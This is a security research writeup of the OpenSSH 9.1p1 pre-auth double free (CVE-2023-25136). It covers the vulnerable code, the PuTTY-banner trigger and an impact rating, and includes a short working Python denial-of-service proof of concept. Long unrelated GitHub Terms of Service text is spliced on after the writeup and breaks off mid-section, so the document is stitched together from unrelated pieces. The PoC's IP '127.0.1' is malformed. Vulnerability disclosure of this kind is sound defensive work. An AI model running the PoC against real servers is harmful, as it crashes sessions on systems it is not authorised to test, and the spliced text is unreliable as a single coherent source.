![OpenSSH Pre-Auth Double Free CVE-2023-25136 Writeup and PoC](data:image/svg+xml...)![OpenSSH Pre-Auth Double Free CVE-2023-25136 Writeup and PoC](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2023/02/08165525/CVE-2023-25136-Writeup-and-PoC-863x300_1.png)

OpenSSH’s newly released version [9.2p1](https://www.openssh.com/txt/release-9.2) contains a fix for a [double-free](https://owasp.org/www-community/vulnerabilities/Doubly_freeing_memory) vulnerability.

Given the severe potential impact of the vulnerability on OpenSSH servers (DoS/RCE) and its high popularity in the industry, this security fix prompted the JFrog Security Research team to investigate the vulnerability.

This blog post provides details on the vulnerability, who is affected, and a proof-of-concept to trigger it causing a Denial of Service (DoS).

**February 14, 2023 Update:**

**Since the publication of this blog post, [Qualys Security has managed](https://seclists.org/oss-sec/2023/q1/92) to leverage this double-free for a limited remote code execution exploit in OpenBSD, when no security mitigations are applied. Therefore, we updated this blog post and our impact analysis to “High”. See “Vulnerability Impact” below.**

## What is OpenSSH?

[OpenSSH](https://www.openssh.com) is a popular tool used for secure communication and remote access. It was developed as a free, open-source implementation of the Secure Shell (SSH) communications protocol and is widely used for various applications.

OpenSSH provides a secure and encrypted connection between two untrusted hosts over an insecure network, making it an essential tool for remote access and secure file transfer.

With the increasing use of cloud computing and remote access to servers, OpenSSH has become a crucial tool for system administrators and developers who need to access and manage remote systems securely.

OpenSSH also supports a wide range of platforms including Linux, macOS, and Windows, making it a widely adopted tool across different operating systems. With its ease of use and strong security features, OpenSSH has become an industry-standard tool for secure remote access.

## Vulnerability Background

On February 2, 2023, OpenSSH released version 9.2p1 with this [security advisory](https://www.openssh.com/txt/release-9.2). It immediately became clear this version is of interest because of the pre-auth double-free vulnerability. Searching the OpenSSH’s GitHub repository, this is the [fix commit](https://github.com/openssh/openssh-portable/commit/12da7823336434a403f25c7cc0c2c6aed0737a35).

The commit message indicates `bz3522`, which refers to the `Bugzilla` [issue](https://bugzilla.mindrot.org/show_bug.cgi?id=3522) reported by the user Mantas Mikulėnas.

In its report, Mantas mentions using PuTTY obsolete version 0.64, also attaching a back-trace of the double-free abort.

## Research Walkthrough

To dive deeper, we set up an environment with the vulnerable OpenSSH 9.1p1 and pulled a copy of the old PuTTY 0.64 version, released 8 years ago on February 28, 2015.

The following error was returned after trying to connect with PuTTY 0.64 to the vulnerable OpenSSH server:

![PuTTY 0.64 Fatal Error](data:image/svg+xml...)![PuTTY 0.64 Fatal Error](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2023/02/08171707/1_PuTTY-0.64-Fatal-Error.png)

Since the obsolete client’s key exchange algorithms are not supported by the new OpenSSH version, we edited the sshd\_config file by adding the following line to the `/etc/ssh/sshd_config`:

`KexAlgorithms +diffie-hellman-group1-sha1`

After restarting the SSH server and trying again, the following error was returned:

![PuTTY Fatal Error](data:image/svg+xml...)![PuTTY Fatal Error](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2023/02/08171733/2_PuTTY-Fatal-Error.png)

After adding another configuration line to the sshd\_config, we were able to connect to the vulnerable OpenSSH server and reproduce the crash:

`HostKeyAlgorithms +ssh-rsa`

Running the server in debug mode (using the `-ddd` flag), the following debug message was returned:

`ssh_sandbox_violation: unexpected system call (arch:0xc000003e,syscall:20 @ 0x7fd7473fb771) [preauth]`

The Syscall number 20 is `writev()` which matches the `Bugzilla` report.

Note that the configuration changes we’ve made were only to reproduce the vulnerability through PuTTY and are not required to exploit it. As we’ll see in the PoC, the default configuration is vulnerable.

## Vulnerability In-Depth Details

We started by examining the fix commit stating that `compat_kex_proposal()` is responsible for the double-free. When the connection compatibility option `SSH_OLD_DHGEX` is true on [1], the second argument `p` is assigned to `cp` on [2] and later freed on [3].

```
/* Always returns pointer to allocated memory, caller must free. */
char *
compat_kex_proposal(struct ssh *ssh, char *p)
{
    char *cp = NULL;

    if ((ssh->compat & (SSH_BUG_CURVE25519PAD|SSH_OLD_DHGEX)) == 0)
        return xstrdup(p);
    debug2_f("original KEX proposal: %s", p);
    if ((ssh->compat & SSH_BUG_CURVE25519PAD) != 0)
        if ((p = match_filter_denylist(p,
            "curve25519-sha256@libssh.org")) == NULL)
            fatal("match_filter_denylist failed");
    if ((ssh->compat & SSH_OLD_DHGEX) != 0) {               [1]
        cp = p;                                             [2]
        if ((p = match_filter_denylist(p,
            "diffie-hellman-group-exchange-sha256,"
            "diffie-hellman-group-exchange-sha1")) == NULL)
            fatal("match_filter_denylist failed");
        free(cp);                                           [3]
    }
    debug2_f("compat KEX proposal: %s", p);
    if (*p == '\0')
        fatal("No supported key exchange algorithms found");
    return p;
}
```

The call to `compat_kex_proposal()` is inside the `do_ssh2_kex()` function:

```
    myproposal[PROPOSAL_KEX_ALGS] = prop_kex = compat_kex_proposal(ssh,
        options.kex_algorithms);
```

The freed `cp=p` from `compat_kex_proposal()` refers to the `options.kex_algorithms` argument.

Searching for `kex_algorithms` in the source code, we encountered the `assemble_algorithms` from the crash in the Bugzilla report:

```
ASSEMBLE(kex_algorithms, def_kex, all_kex);
```

`ASSEMBLE` is a macro for calling the `kex_assemble_names()` function:

```
#define ASSEMBLE(what, defaults, all) \
    do { \
        if ((r = kex_assemble_names(&o->what, defaults, all)) != 0) \
            fatal_fr(r, "%s", #what); \
    } while (0)
```

The `kex_assemble_names()` function is called with the address of `o->kex_algorithms` as its first argument (which is `listp`). This is where the second free occurs.

```
int
kex_assemble_names(char **listp, const char *def, const char *all)
```

Due to the `options.kex_algorithms` handle being freed and becoming a dangling pointer, it’s once again freed causing a double-free.

But where is the `SSH_OLD_DHGEX` option set?

Inside the `compat_banner()` function, which determines bug flags from the SSH protocol banner. A struct named `check[]` lists all the SSH client IDs and their flags. The following snippet shows the Client IDs that are assigned the `SSH_OLD_DHGEX` option. We can also see that WinSCP might also be able to trigger this behavior.

```
        { "PuTTY_Local:*,"  /* dev versions < Sep 2014 */ "PuTTY-Release-0.5*," /* 0.50-0.57, DH-GEX in >=0.52 */
          "PuTTY_Release_0.5*," /* 0.58-0.59 */
          "PuTTY_Release_0.60*,"
          "PuTTY_Release_0.61*,"
          "PuTTY_Release_0.62*,"
          "PuTTY_Release_0.63*,"
          "PuTTY_Release_0.64*",
                    SSH_OLD_DHGEX },
        { "FuTTY*",     SSH_OLD_DHGEX }, /* Putty Fork */
        { "WinSCP_release_4*,"
          "WinSCP_release_5.0*,"
          "WinSCP_release_5.1,"
          "WinSCP_release_5.1.*,"
          "WinSCP_release_5.5,"
          "WinSCP_release_5.5.*,"
          "WinSCP_release_5.6,"
          "WinSCP_release_5.6.*,"
          "WinSCP_release_5.7,"
          "WinSCP_release_5.7.1,"
          "WinSCP_release_5.7.2,"
          "WinSCP_release_5.7.3,"
          "WinSCP_release_5.7.4",
                    SSH_OLD_DHGEX },
```
## Proof-of-Concept

We opted to create a Python Denial of service Proof-of-Concept because of its flexibility and portability. The proof-of-concept triggers the double-free using the `paramiko` package and causes an abort crash.

`paramiko` is a widespread Python SSH implementation, providing both server and client functionality. For the PoC we changed the connecting client version banner to reflect an obsolete client like `PuTTY v0.64`.

Available in [our GitHub repository](https://github.com/jfrog/jfrog-CVE-2023-25136-OpenSSH_Double-Free).

```
import paramiko

VICTIM_IP = "127.0.1"
CLIENT_ID = "PuTTY_Release_0.64"

def main():
    transport = paramiko.Transport(VICTIM_IP)
    transport.local_version = f"SSH-2.0-{CLIENT_ID}"
    transport.connect(username='', password='')

if __name__ == "__main__":
    main()
```
## RCE Proof-of-Concept

The exploit allocates another struct named `EVP_AES_KEY` instead of the freed `options.kex_algorithms`. It’s later freed again when the double-free happens. It then overwrites its contents with another chunk using the `authctxt->user` or `authctxt->style`.

When `EVP_Cipher()` later tries to use this `EVP_AES_KEY`, it’ll use this chunk that overwrote it using attacker-controlled data.

## Vulnerability Impact

The OpenSSH Daemon listens for connections from clients. It forks a new daemon for each incoming connection. The forked daemons handle key exchange, encryption, authentication, command execution, and data exchange.

The vulnerability is a double-free that can theoretically be exploited for a denial of service, as demonstrated by our Proof-of-Concept, and possibly for remote code execution (RCE), although developing a working exploit is considered hard due to security measures in place such as a sandbox and Privilege Separation mechanism. For a denial of service, note that only the forked daemons crash, because of a sandbox violation while trying to call `writev()`, so it leaves the main server daemon free to handle new clients.

According to a recent update, [Qualys Security has managed](https://seclists.org/oss-sec/2023/q1/92) to leverage this double-free for a limited remote code execution exploit when no memory protections are applied (like ASLR or NX).

The JFrog Security Research team gave this vulnerability a **High** severity rating for the following reasons:

* No prerequisites are required. A default configuration is vulnerable.
* When no memory exploitation mitigations are applied (like ASLR or NX), RCE is possible, according to [a recent publication](https://seclists.org/oss-sec/2023/q1/92).
* As for a Denial of Service attack, crashing a forked worker process is much less severe than a DoS that crashes an important daemon, but they will both receive a “High” Availability impact CVSS rating.
* Note that OpenSSH has put security measures in place such as a sandbox and Privilege Separation mechanism, but they should not lower the severity of the possible RCE attack.

## Vulnerability Targets

The vulnerability applies only to OpenSSH version 9.1p1 with a default configuration, meaning no prerequisites are required.

## Remediation

It’s strongly recommended to upgrade OpenSSH to the latest version 9.2p1.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

By agreeing to these Terms, you are giving us permission to charge your on-file credit card, PayPal account, or other approved methods of payment for fees that you authorize for GitHub.

### [5. Responsibility for Payment](#5-responsibility-for-payment)

You are responsible for all fees, including taxes, associated with your use of the Service. By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service. If you dispute the matter, contact us through the [GitHub Support portal](https://support.github.com/). You are responsible for providing us with a valid means of payment for paid Accounts. Free Accounts are not required to provide payment information.

## [L. Cancellation and Termination](#l-cancellation-and-termination)

**Short version:** *You may close your Account at any time. If you do, we'll treat your information responsibly.*

### [1. Account Cancellation](#1-account-cancellation)

It is your responsibility to properly cancel your Account with GitHub. You can [cancel your Account at any time](/en/billing/managing-the-plan-for-your-github-account/downgrading-your-accounts-plan) by going into your Settings in the global navigation bar at the top of the screen. The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

GitHub has the right to suspend or terminate your access to all or any part of the Website at any time, with or without cause, with or without notice, effective immediately. GitHub reserves the right to refuse service to anyone for any reason at any time.

### [4. Survival](#4-survival)

All provisions of this Agreement which, by their nature, should survive termination *will* survive termination — including, without limitation: ownership provisions, warranty disclaimers, indemnity, and limitations of liability.

## [M. Communications with GitHub](#m-communications-with-github)

**Short version:** *We use email and other electronic means to stay in touch with our users.*

### [1. Electronic Communication Required](#1-electronic-communication-required)

For contractual purposes, you (1) consent to receive communications from us in an electronic form via the email address you have submitted or via the Service; and (2) agree that all Terms of Service, agreements, notices, disclosures, and other communications that we provide to you electronically satisfy any legal requirement that those communications would satisfy if they were on paper. This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

